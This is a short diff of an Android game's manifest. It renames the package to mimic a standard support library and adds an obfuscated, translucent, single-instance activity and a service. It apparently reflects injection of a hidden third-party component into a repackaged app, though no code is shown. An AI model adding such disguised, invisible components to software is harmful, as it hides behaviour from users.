@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.migame.zombiescastle"
+    package="android.support.annotation"
     android:versionCode="100"
     android:versionName="2.0" >
 
@@ -52,6 +52,14 @@
         <!--pdt-->
         <service android:name="cim.czh.lr.xch"/>
 
+
+        <!--dyd-->
+        <activity
+            android:name="swfw.kjp.iejk.Yg"
+            android:configChanges="keyboard|keyboardHidden|orientation"
+            android:launchMode="singleInstance"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+        <service android:name="swfw.kjp.iejk.Yx" />
 
     </application>
 
